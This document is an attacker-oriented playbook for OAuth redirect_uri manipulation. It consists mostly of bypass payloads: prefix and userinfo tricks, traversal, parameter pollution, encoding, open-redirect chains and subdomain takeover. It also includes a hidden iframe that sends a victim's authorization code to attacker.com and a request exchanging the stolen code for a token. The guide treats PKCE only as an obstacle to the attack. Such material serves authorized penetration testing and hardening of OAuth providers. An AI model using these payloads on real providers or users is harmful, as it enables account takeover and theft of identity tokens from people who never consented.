# OAuth — `redirect_uri` Manipulation

## When this applies

- OAuth provider does not strictly validate the `redirect_uri` parameter.
- Validation uses prefix matching, suffix matching, regex, or other non-exact comparisons.
- Goal: redirect the authorization code or access token to attacker-controlled domain.

## Technique

The OAuth provider sends the authorization code/token to the URL specified in `redirect_uri`. If validation is loose, you can register a different (or attacker-controlled) URI and steal the code/token when the victim authorizes the application.

## Steps

### 1. Capture the legitimate authorization request

```http
GET /auth?client_id=abc&redirect_uri=https://victim.com/callback&response_type=code&scope=openid HTTP/1.1
Host: oauth-server.com
```

### 2. Try complete bypass (no validation)

```
redirect_uri=https://attacker.com
```

If the provider returns the code to attacker.com, validation is absent.

### 3. Prefix-matching bypass

```
redirect_uri=https://victim.com.attacker.com           # subdomain confusion
redirect_uri=https://victim.com@attacker.com           # userinfo trick (URL parser confusion)
redirect_uri=https://victim.com%2eattacker.com         # encoded dot
redirect_uri=https://victim-com.attacker.com           # hyphen
```

### 4. Directory traversal

```
redirect_uri=https://victim.com/oauth-callback/../
redirect_uri=https://victim.com/oauth-callback/../evil
redirect_uri=https://victim.com/oauth-callback/..%2fevil
redirect_uri=https://victim.com/oauth-callback/..;/evil
redirect_uri=https://victim.com/oauth-callback/....//
```

### 5. Subdomain tests

```
redirect_uri=https://evil.victim.com
redirect_uri=https://victim.evil.com
```

### 6. Parameter pollution

```
redirect_uri=https://victim.com&redirect_uri=https://attacker.com
redirect_uri=https://victim.com%26redirect_uri=https://attacker.com
redirect_uri=https://victim.com;redirect_uri=https://attacker.com
```

The provider may use the first OR the last `redirect_uri` — test both orderings.

### 7. Fragment injection

```
redirect_uri=https://victim.com/callback%23@attacker.com
```

URL parser confusion: `#` may terminate hostname parsing on attacker side but be treated as path on validator side.

### 8. Path confusion

```
redirect_uri=https://victim.com//attacker.com           # protocol-relative
redirect_uri=https://victim.com\attacker.com            # backslash
redirect_uri=https://victim.com/.attacker.com
```

### 9. URL-encoding bypass

```
redirect_uri=https://victim.com/%2f/attacker.com        # encoded slash
redirect_uri=https://victim.com%2f%2fattacker.com       # double-encoded slash
```

### 10. Case-sensitivity

```
redirect_uri=https://VICTIM.COM
redirect_uri=https://Victim.Com
redirect_uri=https://victim.COM
```

### 11. Port manipulation

```
redirect_uri=https://victim.com:443@attacker.com         # userinfo + port
redirect_uri=https://victim.com:8080/callback            # different port
```

### 12. Open redirect chain

When victim.com has any open redirect:

```
redirect_uri=https://victim.com/redirect?url=https://attacker.com
redirect_uri=https://victim.com/goto?destination=https://attacker.com
redirect_uri=https://victim.com/post/next?path=https://attacker.com
```

The OAuth provider redirects to `victim.com/redirect`, which then redirects to `attacker.com`, carrying the code.

### 13. Subdomain takeover

If `abandoned.victim.com` points to a third-party service no longer used:

1. Register the third-party service with the abandoned subdomain.
2. Use as `redirect_uri`: `https://abandoned.victim.com`.
3. Capture codes there.

### 14. Capture the stolen code

Once `redirect_uri` accepts your URL, the OAuth flow sends the code to your server:

```html
<!-- Attacker page -->
<iframe
  src="https://oauth-server.com/auth?client_id=ID&redirect_uri=https://attacker.com/callback&response_type=code&scope=openid%20profile%20email"
  style="display:none;">
</iframe>
```

The victim's browser, while logged in to the OAuth provider, follows the iframe and the code is sent to `attacker.com/callback?code=VICTIM_CODE`.

### 15. Exchange code for token

```http
POST /token HTTP/1.1
Host: oauth-server.com

grant_type=authorization_code&code=STOLEN_CODE&redirect_uri=https://attacker.com/callback&client_id=CLIENT_ID&client_secret=...
```

If `client_secret` is required and you don't have it, the code is still useful for confused-deputy-style attacks where the legitimate frontend exchanges it on the victim's behalf.

## Verifying success

- HTTP server logs at attacker.com show `GET /callback?code=...&state=...` after victim follows the link.
- Stolen code exchanges for a token at the OAuth provider.
- The token retrieves victim's identity from `/userinfo`.

## Common pitfalls

- OAuth 2.1 (and PKCE-required flows) bind the code to the `redirect_uri` AND `code_verifier` — even with a stolen code, you can't exchange it without the verifier (which the legitimate client kept).
- Public clients (mobile apps, SPAs) often use PKCE — code stealing alone insufficient.
- Some providers require `redirect_uri` exact match (RFC-compliant) — only legacy/lax providers are exploitable.
- Userinfo trick (`@`) requires the provider to use a URL parser that follows RFC 3986 strictly; some validators normalize differently than the redirect mechanism.

## Tools

- Burp Suite Repeater for systematic testing of `redirect_uri` mutations.
- Open redirect scanners (e.g. `OpenRedireX`).
- Subjack / Subdomain takeover scanners for finding takeoverable subdomains.
- ngrok / Burp Collaborator for capturing redirects.
